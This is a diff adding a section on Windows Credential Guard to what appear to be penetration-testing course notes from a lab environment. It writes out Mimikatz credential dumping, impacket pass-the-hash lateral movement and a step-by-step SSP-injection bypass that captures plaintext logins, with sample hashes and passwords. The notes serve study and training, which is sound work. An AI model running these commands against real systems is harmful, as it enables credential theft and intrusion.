@@ -877,3 +877,129 @@ dir \\<local ip>\test
 - Target user must have admin privileges on destination system
 - UAC remote restrictions must be disabled (except for built-in Administrator)
 - SMB connectivity between systems required
+
+### 3.5 Windows Credential Guard
+
+Windows Credential Guard is a security feature that protects domain credentials by storing them in a virtualized, isolated environment. This mitigation prevents traditional hash extraction techniques from accessing cached domain credentials.
+
+**Credential Storage Differences**
+- **Local accounts**: Stored in SAM database
+- **Domain accounts**: Cached in LSASS memory (without Credential Guard)
+- **With Credential Guard**: Domain credentials isolated in VTL1
+
+**Domain Credential Extraction (No Credential Guard)**
+```cmd
+# RDP to target as domain user
+xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246
+
+# Extract cached domain credentials with Mimikatz
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+# Example output shows domain hash:
+# Domain : CORP
+# NTLM   : 160c0b16dd0ee77e7c494e38252f7ddf
+```
+
+**Pass-the-Hash with Domain Credentials**
+```bash
+# Use extracted domain hash for lateral movement
+impacket-wmiexec -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
+```
+
+**Virtualization-Based Security (VBS)**
+- Runs hypervisor on physical hardware
+- Creates isolated memory regions (Virtual Trust Levels)
+- **VTL0**: Normal Windows environment
+- **VTL1**: Secure isolated environment for critical functions
+
+**Credential Guard Implementation**
+- LSASS runs as LSAISO.exe trustlet in VTL1
+- Communicates with LSASS.exe in VTL0 via RPC
+- Domain credentials encrypted and inaccessible from VTL0
+
+**Checking Credential Guard Status**
+```powershell
+# Verify Credential Guard is enabled
+Get-ComputerInfo
+
+# Key indicators:
+# DeviceGuardSecurityServicesRunning : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
+# HyperVisorPresent                  : True
+```
+
+**Credential Guard Impact on Mimikatz**
+```cmd
+# Mimikatz output with Credential Guard enabled
+mimikatz # sekurlsa::logonpasswords
+
+# Domain user shows encrypted data:
+# LSA Isolated Data: NtlmHash
+# KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
+# Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d
+
+# Local users still accessible
+```
+
+**Bypassing Credential Guard with SSP Injection**
+
+Security Support Provider (SSP) Concept:
+- SSPI handles all Windows authentication
+- SSPs loaded as DLLs during system startup
+- Can register custom SSPs via AddSecurityPackage API
+- SSPs receive plaintext credentials during authentication
+
+**Mimikatz SSP Injection**
+```cmd
+# Inject malicious SSP into LSASS memory
+mimikatz # privilege::debug
+mimikatz # misc::memssp
+
+# Output: Injected =)
+# SSP will capture future authentication attempts
+```
+
+**Credential Capture Process**
+1. Inject SSP with Mimikatz
+2. Wait for user authentication (RDP, login, etc.)
+3. Check captured credentials in log file
+
+**Retrieving Captured Credentials**
+```cmd
+# Check captured plaintext credentials
+type C:\Windows\System32\mimilsa.log
+
+# Example output:
+# [00000000:00af2311] CORP\Administrator  QWERTY123!@#
+# [00000000:00b1dd77] CLIENTWK245\offsec  lab
+```
+
+**Complete Credential Guard Bypass Workflow**
+```cmd
+# Step 1: Verify Credential Guard is enabled
+Get-ComputerInfo | findstr CredentialGuard
+
+# Step 2: Inject SSP
+mimikatz # privilege::debug
+mimikatz # misc::memssp
+
+# Step 3: Trigger authentication (social engineering, wait for logins)
+# User connects via RDP or authenticates
+
+# Step 4: Retrieve captured credentials
+type C:\Windows\System32\mimilsa.log
+```
+
+**Credential Guard Limitations**
+- Only protects domain credentials
+- Local account hashes still accessible
+- SSP injection bypasses protection
+- Requires user authentication after injection
+
+**Key Characteristics**
+- **Enabled by default**: Modern Windows installations
+- **Legacy systems**: Disabled on updated (not fresh install) systems
+- **Protection scope**: Domain credentials only
+- **Bypass method**: SSP injection for plaintext capture
+
+Windows Credential Guard significantly raises the bar for credential theft but can be bypassed through SSP injection techniques that capture plaintext credentials during the authentication process.
